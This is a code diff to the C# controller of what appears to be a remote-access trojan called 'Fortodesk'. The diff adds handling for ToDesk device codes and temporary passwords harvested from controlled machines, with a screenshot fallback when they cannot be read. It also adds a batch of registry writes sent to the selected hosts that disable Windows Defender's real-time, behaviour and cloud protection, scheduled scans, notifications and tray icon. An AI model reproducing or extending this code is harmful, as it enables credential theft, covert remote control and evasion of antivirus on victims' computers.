@@ -884,7 +884,7 @@ namespace Fortodesk
             string msg = Encoding.UTF8.GetString(data);
             string[] parts = msg.Split('|');
 
-            if (parts.Length < 4)
+            if (parts.Length < 3)
             {
                 AppendLog($"{tag}[ToDesk信息] 格式错误: {msg}");
                 return;
@@ -893,7 +893,6 @@ namespace Fortodesk
             string type = parts[0].Trim();
             string taskId = parts[parts.Length - 1].Trim();
 
-            // 找UniqueId
             string uniqueId = null;
             if (client != null)
             {
@@ -903,13 +902,19 @@ namespace Fortodesk
 
             if (type == "OK")
             {
+                // ★ 获取到凭据，只显示文字，不接收截图
                 string deviceCode = parts.Length > 1 ? parts[1].Trim() : "";
                 string password = parts.Length > 2 ? parts[2].Trim() : "";
                 string cpuTag = parts.Length > 3 ? parts[3].Trim() : "";
-
                 AppendLog($"[{cpuTag}] [ToDesk设备代码] {deviceCode}");
                 AppendLog($"[{cpuTag}] [ToDesk临时密码] {password}");
-                AppendLog($"[{cpuTag}] [ToDesk截图] 正在接收图片...");
+            }
+            else if (type == "SCREENSHOT")
+            {
+                // ★ 找到ToDesk但获取不到凭据，接收截图
+                string reason = parts.Length > 1 ? parts[1].Trim() : "";
+                string cpuTag = parts.Length > 2 ? parts[2].Trim() : "";
+                AppendLog($"[{cpuTag}] [ToDesk] {reason}，正在接收截图...");
 
                 if (string.IsNullOrEmpty(uniqueId))
                 {
@@ -920,7 +925,6 @@ namespace Fortodesk
                 string capturedUniqueId = uniqueId;
                 string capturedTaskId = taskId;
                 string capturedCpuTag = cpuTag;
-
                 Thread t = new Thread(() =>
                     WaitAndRecvFileWithTaskId(capturedUniqueId, capturedTaskId,
                         $"[{capturedCpuTag}] [ToDesk截图] "));
@@ -929,10 +933,10 @@ namespace Fortodesk
             }
             else
             {
+                // ERROR
                 string reason = parts.Length > 1 ? parts[1].Trim() : msg;
                 string cpuTag = parts.Length > 2 ? parts[2].Trim() : "";
                 AppendLog($"[{cpuTag}] [ToDesk信息] 获取失败: {reason}");
-                // ERROR 时不要尝试接文件
             }
         }
 
@@ -3959,15 +3963,37 @@ namespace Fortodesk
             var selected = objectListView.SelectedObjects;
             if (selected == null || selected.Count == 0) { AppendLog("请先选择被控端"); return; }
 
-            string payload = "SOFTWARE\nFortodeskTest\n\n\n\nDELETE_KEY";
-            AppendLog($"发送删除指令: {payload.Replace("\n", "\\n")}");  // 确认payload正确
+            var regOps = new[]
+            {
+                // 主开关
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\nDisableAntiSpyware\nREG_DWORD\n1\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\nDisableAntiVirus\nREG_DWORD\n1\nWRITE",
+                // 实时保护
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableRealtimeMonitoring\nREG_DWORD\n1\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableBehaviorMonitoring\nREG_DWORD\n1\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableOnAccessProtection\nREG_DWORD\n1\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableScanOnRealtimeEnable\nREG_DWORD\n1\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Real-Time Protection\nDisableIOAVProtection\nREG_DWORD\n1\nWRITE",
+                // 云保护
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Spynet\nSpynetReporting\nREG_DWORD\n0\nWRITE",
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Spynet\nSubmitSamplesConsent\nREG_DWORD\n2\nWRITE",
+                // 计划扫描
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\Scan\nDisableScheduledScanning\nREG_DWORD\n1\nWRITE",
+                // 通知
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender\\UX Configuration\nNotification_Suppress\nREG_DWORD\n1\nWRITE",
+                // 隐藏任务栏图标
+                "SOFTWARE\nPolicies\\Microsoft\\Windows Defender Security Center\\Systray\nHideSystray\nREG_DWORD\n1\nWRITE",
+            };
+
+            // ★ 拼成一条批量payload，用\n\n分隔，只发一次
+            string batchPayload = string.Join("\n\n", regOps);
 
             foreach (var obj in selected)
             {
                 HostInfo host = obj as HostInfo;
                 if (host == null) continue;
-                AppendLog($"[{host.HostName}] 已发送删除注册表键指令");
-                SendCmdToHost(host, CMD_REG_WRITE_AUTO, Encoding.UTF8.GetBytes(payload));
+                SendCmdToHost(host, CMD_REG_WRITE_AUTO, Encoding.UTF8.GetBytes(batchPayload));
+                AppendLog($"[{host.HostName}] 已发送关闭Defender指令（共{regOps.Length}条）");
             }
         }
     }
